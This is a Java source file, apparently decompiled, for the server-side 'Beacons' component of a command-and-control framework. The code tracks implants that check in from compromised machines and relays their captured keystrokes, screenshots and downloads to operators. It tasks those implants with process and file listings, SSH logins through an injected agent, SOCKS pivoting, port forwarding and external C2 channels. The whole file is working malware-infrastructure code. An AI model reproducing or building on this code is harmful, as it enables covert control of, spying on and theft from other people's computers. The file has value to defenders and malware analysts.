package server;

import beacon.BeaconData;
import beacon.BeaconSetup;
import beacon.BeaconSocks;
import beacon.CheckinListener;
import beacon.CommandBuilder;
import beacon.TaskBeaconCallback;
import beacon.setup.SSHAgent;
import common.BeaconEntry;
import common.BeaconOutput;
import common.CommonUtils;
import common.Do;
import common.Download;
import common.Keystrokes;
import common.LoggedEvent;
import common.Reply;
import common.Request;
import common.ScListener;
import common.Screenshot;
import common.Timers;
import dialog.DialogUtils;
import extc2.ExternalC2Server;

import java.io.Serializable;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class Beacons implements ServerHook, CheckinListener, Do {
    protected Resources resources;

    protected WebCalls web;

    protected Map<String, BeaconEntry> beacons = new HashMap();

    protected BeaconData data = null;

    protected BeaconSocks socks = null;

    protected Map cmdlets = new HashMap();

    protected BeaconSetup setup = null;

    protected Map notes = new HashMap();

    protected Map accents = new HashMap();

    protected Set empty = new HashSet();

    protected List<String> initial = new LinkedList();

    public void register(Map map) {
        map.put("beacons.remove", this);
        map.put("beacons.task", this);
        map.put("beacons.clear", this);
        map.put("beacons.log_write", this);
        map.put("beacons.pivot", this);
        map.put("beacons.pivot_stop", this);
        map.put("beacons.pivot_stop_port", this);
        map.put("beacons.mode", this);
        map.put("beacons.report_posh", this);
        map.put("beacons.unlink", this);
        map.put("beacons.start", this);
        map.put("beacons.stop", this);
        map.put("beacons.portfwd", this);
        map.put("beacons.rportfwd", this);
        map.put("beacons.note", this);
        map.put("beacons.task_ssh_login", this);
        map.put("beacons.task_ssh_login_pubkey", this);
        map.put("beacons.task_ipconfig", this);
        map.put("beacons.task_ps", this);
        map.put("beacons.task_ls", this);
        map.put("beacons.task_ls_default", this);
        map.put("beacons.task_drives", this);
        map.put("beacons.task_drives_default", this);
        map.put("beacons.downloads", this);
        map.put("beacons.download_cancel", this);
        map.put("beacons.reset", this);
        map.put("beacons.whitelist_port", this);
        map.put("exoticc2.start", this);
        map.put("beacons.update", this);
        map.put("beacons.push", this);
    }

    public void checkin(ScListener scListener, BeaconEntry beaconEntry) {
        synchronized (this) {
            if (!beaconEntry.isEmpty()) {
                BeaconEntry entry = this.beacons.get(beaconEntry.getId());
                if (entry == null || entry.isEmpty()) {
                    ServerUtils.addTarget(this.resources,
                            beaconEntry.getInternal(), beaconEntry.getComputer(),
                            null, beaconEntry.getOperatingSystem(), beaconEntry.getVersion());
                    ServerUtils.addSession(this.resources, beaconEntry.toMap());
                    if (!beaconEntry.isLinked() && scListener != null) {
                        ServerUtils.addC2Info(this.resources,
                                scListener.getC2Info(beaconEntry.getId()));
                    }
                    this.resources.broadcast("eventlog",
                            LoggedEvent.BeaconInitial(beaconEntry));
                    this.initial.add(beaconEntry.getId());
                    this.resources.process(beaconEntry);
                }
            }
            this.beacons.put(beaconEntry.getId(), beaconEntry);
        }
    }

    public void output(BeaconOutput beaconOutput) {
        this.resources.broadcast("beaconlog", beaconOutput);
    }

    public boolean moment(String string) {
        this.resources.broadcast("beacons", buildBeaconModel());
        synchronized (this) {
            for (String str : this.initial) {
                if ("session".equals(CommonUtils.session(str))) {
                    ServerUtils.fireEvent(this.resources, "ssh_initial", str);
                    continue;
                }
                ServerUtils.fireEvent(this.resources, "beacon_initial", str);
            }
            this.initial.clear();
        }
        return true;
    }

    public void screenshot(Screenshot screenshot) {
        this.resources.broadcast("screenshots", screenshot);
    }

    public void keystrokes(Keystrokes keystrokes) {
        this.resources.broadcast("keystrokes", keystrokes);
    }

    public void download(Download download) {
        this.resources.broadcast("downloads", download);
    }

    public void push(String string, Serializable serializable) {
        this.resources.broadcast(string, serializable, true);
    }

    public Map<String, BeaconEntry> buildBeaconModel() {
        synchronized (this) {
            HashMap<String, BeaconEntry> hashMap = new HashMap();
            for (BeaconEntry beaconEntry : this.beacons.values()) {
                beaconEntry.touch();
                if (this.notes.containsKey(beaconEntry.getId())) {
                    beaconEntry.setNote(this.notes.get(beaconEntry.getId()) + "");
                }
                if (this.accents.containsKey(beaconEntry.getId())) {
                    beaconEntry.setAccent(this.accents.get(beaconEntry.getId()) + "");
                }
                hashMap.put(beaconEntry.getId(), beaconEntry.copy());
            }
            return hashMap;
        }
    }

    public BeaconEntry resolve(String string) {
        synchronized (this) {
            return this.beacons.get(string);
        }
    }

    public BeaconEntry resolveEgress(String string) {
        synchronized (this) {
            BeaconEntry beaconEntry = resolve(string);
            if (beaconEntry == null) {
                return null;
            }
            if (beaconEntry.isLinked()) {
                return resolveEgress(beaconEntry.getParentId());
            }
            return beaconEntry;
        }
    }

    public Beacons(Resources resources) {
        this.resources = resources;
        this.web = ServerUtils.getWebCalls(resources);
        Timers.getTimers().every(1000L, "beacons", this);
        resources.put("beacons", this);
        this.setup = new BeaconSetup(this.resources);
        this.setup.getController().setCheckinListener(this);
        this.data = this.setup.getController().getData();
        this.socks = this.setup.getController().getSocks();
        this.resources.broadcast("cmdlets", new HashMap(), true);
    }

    public void update(String string1, long l, String string2, boolean bl) {
        synchronized (this) {
            BeaconEntry beaconEntry = this.beacons.get(string1);
            if (beaconEntry == null) {
                beaconEntry = new BeaconEntry(string1);
                this.beacons.put(string1, beaconEntry);
            }
            if (l > 0L)
                beaconEntry.setLastCheckin(l);
            if (string2 != null)
                beaconEntry.setExternal(string2);
            if (bl)
                beaconEntry.delink();
            if (string2 == null && beaconEntry.isEmpty() && !this.empty.contains(string1)) {
                this.empty.add(string1);
                ServerUtils.fireEvent(this.resources, "beacon_initial_empty", string1);
            }
        }
    }

    public void note(String string1, String string2) {
        synchronized (this) {
            this.notes.put(string1, string2);
        }
    }

    public int callback(Request request, ManageUser manageUser) {
        return this.setup.getController().register(request, manageUser);
    }

    public void call(Request request, ManageUser manageUser) {
        try {
            if (request.is("beacons.remove", 1)) {
                String str = request.arg(0) + "";
                synchronized (this) {
                    BeaconEntry beaconEntry = this.beacons.get(str);
                    if (beaconEntry != null && beaconEntry.isLinked()) {
                        this.setup.getController().dead_pipe(beaconEntry.getParentId(), str);
                    }
                    this.beacons.remove(str);
                    this.notes.remove(str);
                    this.accents.remove(str);
                }
            } else if (request.is("beacons.reset", 0)) {
                synchronized (this) {
                    this.empty = new HashSet();
                    this.initial = new LinkedList();
                    this.notes = new HashMap();
                    this.accents = new HashMap();
                    this.beacons = new HashMap();
                    this.setup.getController().getPipes().reset();
                }
            } else if (request.is("beacons.log_write", 1)) {
                synchronized (this) {
                    BeaconOutput beaconOutput = (BeaconOutput) request.arg(0);
                    beaconOutput.from = manageUser.getNick();
                    beaconOutput.touch();
                    this.resources.broadcast("beaconlog", request.arg(0));
                }
            } else if (request.is("beacons.clear", 1)) {
                String str = request.arg(0) + "";
                this.data.clear(str);
            } else if (request.is("beacons.task", 2)) {
                String str = request.arg(0) + "";
                byte[] arrby = (byte[]) request.arg(1);
                this.data.task(str, arrby);
            } else if (request.is("beacons.pivot", 2)) {
                String str = request.arg(0) + "";
                int i = (Integer) request.arg(1);
                this.socks.pivot(str, i);
                this.data.seen(str);
            } else if (request.is("beacons.portfwd", 3)) {
                String str1 = request.arg(0) + "";
                String str2 = request.arg(1) + "";
                int i = (Integer) request.arg(2);
                this.socks.portfwd(str1, i, str2, i);
                this.data.seen(str1);
            } else if (request.is("beacons.rportfwd", 4)) {
                String str1 = request.arg(0) + "";
                int i = (Integer) request.arg(1);
                String str2 = request.arg(2) + "";
                int j = (Integer) request.arg(3);
                this.socks.rportfwd(str1, i, str2, j);
                this.data.seen(str1);
            } else if (request.is("beacons.pivot_stop_port", 1)) {
                int i = Integer.parseInt(request.arg(0) + "");
                this.socks.stop_port(i);
            } else if (request.is("beacons.pivot_stop", 1)) {
                String str = request.arg(0) + "";
                this.socks.stop(str);
            } else if (request.is("beacons.mode", 2)) {
                String str1 = request.arg(0) + "";
                String str2 = request.arg(1) + "";
                this.data.mode(str1, str2);
            } else if (request.is("beacons.report_posh", 2)) {
                String str = request.arg(0) + "";
                List list = (List) request.arg(1);
                synchronized (this) {
                    this.cmdlets.put(str, list);
                    this.resources.broadcast("cmdlets", new HashMap(this.cmdlets), true);
                }
            } else if (request.is("beacons.unlink", 2)) {
                String str1 = request.arg(0) + "";
                String str2 = request.arg(1) + "";
                this.setup.getController().unlink(str1, str2);
            } else if (request.is("beacons.unlink", 3)) {
                String str1 = request.arg(0) + "";
                String str2 = request.arg(1) + "";
                String str3 = request.arg(2) + "";
                this.setup.getController().unlink(str1, str2, str3);
            } else if (request.is("beacons.start", 1)) {
                Map map = (Map) request.arg(0);
                String str1 = "success";
                String str2 = DialogUtils.string(map, "name");
                if (!this.setup.start(map)) {
                    str1 = this.setup.getLastError();
                    CommonUtils.print_error("Listener: " + str2 + " failed: " + str1);
                } else {
                    CommonUtils.print_good("Listener: " + str2 + " started!");
                }
                if (manageUser != null)
                    manageUser.write(request.reply(str1));
                this.resources.call("listeners.set_status", CommonUtils.args(str2, str1));
            } else if (request.is("beacons.stop", 1)) {
                Map map = (Map) request.arg(0);
                String str = DialogUtils.string(map, "name");
                this.setup.stop(str);
            } else if (request.is("beacons.note", 2)) {
                String str1 = (String) request.arg(0);
                String str2 = (String) request.arg(1);
                note(str1, str2);
            } else if (request.is("beacons.task_ssh_login", 6)
                    || request.is("beacons.task_ssh_login_pubkey", 6)) {
                String str1 = request.arg(0) + "";
                String str2 = request.arg(1) + "";
                String str3 = request.arg(2) + "";
                String str4 = request.arg(3) + "";
                int i = ((Integer) request.arg(4)).intValue();
                String str5 = request.arg(5) + "";
                boolean bool = request.is("beacons.task_ssh_login_pubkey");
                String str6 = "\\\\%s\\pipe\\session\\" + CommonUtils.garbage("SSHAGENT");
                SSHAgent sSHAgent = new SSHAgent(this.setup,
                        ServerUtils.getProfile(this.resources),
                        str4, i, str2, str3, str6, bool);
                CommandBuilder commandBuilder = new CommandBuilder();
                if ("x86".equals(str5)) {
                    commandBuilder.setCommand(1);
                } else {
                    commandBuilder.setCommand(44);
                }
                commandBuilder.addString(sSHAgent.export(str5));
                this.data.task(str1, commandBuilder.build());
                commandBuilder = new CommandBuilder();
                commandBuilder.setCommand(40);
                commandBuilder.addInteger(0);
                commandBuilder.addShort(27);
                commandBuilder.addShort(30000);
                commandBuilder.addLengthAndString(sSHAgent.getStatusPipeName());
                commandBuilder.addLengthAndString("SSH status");
                this.data.task(str1, commandBuilder.build());
            } else if (request.is("beacons.task_ipconfig", 1)) {
                String str = request.arg(0) + "";
                byte[] arrby = new TaskBeaconCallback().IPConfig(callback(request, manageUser));
                this.data.task(str, arrby);
            } else if (request.is("beacons.task_ps", 1)) {
                String str = request.arg(0) + "";
                byte[] arrby = new TaskBeaconCallback().Ps(callback(request, manageUser));
                this.data.task(str, arrby);
            } else if (request.is("beacons.task_drives", 1)) {
                String str = request.arg(0) + "";
                byte[] arrby = new TaskBeaconCallback().Drives(callback(request, manageUser));
                this.data.task(str, arrby);
            } else if (request.is("beacons.task_drives_default", 1)) {
                String str = request.arg(0) + "";
                byte[] arrby = new TaskBeaconCallback().Drives(-1);
                this.data.task(str, arrby);
            } else if (request.is("beacons.task_ls", 2)) {
                String str1 = request.arg(0) + "";
                String str2 = request.arg(1) + "";
                byte[] arrby = new TaskBeaconCallback().Ls(callback(request, manageUser), str2);
                this.data.task(str1, arrby);
            } else if (request.is("beacons.task_ls_default", 2)) {
                String str1 = request.arg(0) + "";
                String str2 = request.arg(1) + "";
                byte[] arrby = new TaskBeaconCallback().Ls(-2, str2);
                this.data.task(str1, arrby);
            } else if (request.is("beacons.downloads", 1)) {
                String str = request.arg(0) + "";
                List list = this.setup.getController().getDownloads(str);
                manageUser.writeNow(request.reply(list));
            } else if (request.is("beacons.download_cancel", 2)) {
                String str1 = request.arg(0) + "";
                String str2 = request.arg(1) + "";
                List<Map> list = this.setup.getController().getDownloads(str1);
                Iterator iterator = list.iterator();
                while (iterator.hasNext()) {
                    Map map = (Map) iterator.next();
                    String str = map.get("name") + "";
                    if (!CommonUtils.iswm(str2, str)) {
                        iterator.remove();
                    }
                }
                for (Map map : list) {
                    String str3 = map.get("name") + "";
                    String str4 = map.get("fid") + "";
                    this.setup.getController().getDownloadManager()
                            .close(str1, Integer.parseInt(str4));
                    CommandBuilder commandBuilder = new CommandBuilder();
                    commandBuilder.setCommand(19);
                    commandBuilder.addInteger(Integer.parseInt(str4));
                    this.data.task(str1, commandBuilder.build());
                    output(BeaconOutput.Task(str1, "canceled download of: " + str3));
                }
            } else if (request.is("beacons.whitelist_port", 2)) {
                String str1 = (String) request.arg(0);
                String str2 = request.arg(1) + "";
                this.setup.getController().whitelistPort(str1, str2);
            } else if (request.is("exoticc2.start", 2)) {
                String str = (String) request.arg(0);
                int i = Integer.parseInt(request.arg(1) + "");
                this.setup.initCrypto();
                new ExternalC2Server(this.setup, null, str, i);
            } else if (request.is("beacons.update", 2)) {
                String str = request.arg(0) + "";
                Map<String, String> map = (Map) request.arg(1);
                synchronized (this) {
                    for (Map.Entry entry : map.entrySet()) {
                        if ("_accent".equals(entry.getKey())) {
                            this.accents.put(str, entry.getValue());
                        }
                    }
                }
            } else if (request.is("beacons.push", 0)) {
                synchronized (this) {
                    this.resources.broadcast("beacons", buildBeaconModel());
                }
            } else {
                manageUser.writeNow(new Reply("server_error", 0L, request
                        + ": incorrect number of arguments"));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
